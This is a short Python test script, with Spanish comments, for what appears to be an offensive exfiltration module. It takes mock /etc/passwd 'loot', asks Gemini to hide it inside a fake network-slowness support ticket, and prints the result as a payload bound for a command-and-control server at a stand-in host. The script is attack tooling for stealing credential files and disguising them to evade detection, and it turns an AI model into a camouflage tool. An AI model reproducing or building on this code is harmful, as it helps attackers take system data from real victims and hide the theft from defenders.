import asyncio
import os
from dotenv import load_dotenv

# Set logging
import logging
logging.basicConfig(level=logging.INFO)

from backend.offensiva.evidence_exfil import EvidenceExfilOrchestrator

async def run_test():
    load_dotenv()
    print("🚀 Iniciando prueba de Esteganografía Generativa (P5-C)...")
    
    # 1. Dummy Loot (Mock /etc/passwd contents)
    loot_data = b"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash"
    filename = "passwd_dump.txt"
    print(f"\n📦 Loot original a robar: {filename} ({len(loot_data)} bytes)")
    print(loot_data.decode())
    
    # 2. Orquestador
    orchestrator = EvidenceExfilOrchestrator(c2_url="http://null_c2.local")
    
    # 3. Prueba AI: Generando camouflage
    theme = "un ticket de soporte técnico quejándose de lentitud de red, adjuntando un fragmento de volcado para revisión"
    print(f"\n🧠 Invocando a Gemini para ocultar datos en el tema: '{theme}'")
    
    try:
        payload_bytes = await orchestrator._prepare_payload(
            data=loot_data, 
            filename=filename, 
            use_ai=True, 
            theme=theme
        )
        
        print("\n✅ RESULTADO OBTENIDO (Payload de Red):")
        print("-" * 50)
        print(payload_bytes.decode('utf-8'))
        print("-" * 50)
        print(f"Longitud final a enviar al C2: {len(payload_bytes)} bytes")
        
    except Exception as e:
        print(f"❌ Error durante el camuflaje: {e}")

if __name__ == "__main__":
    asyncio.run(run_test())
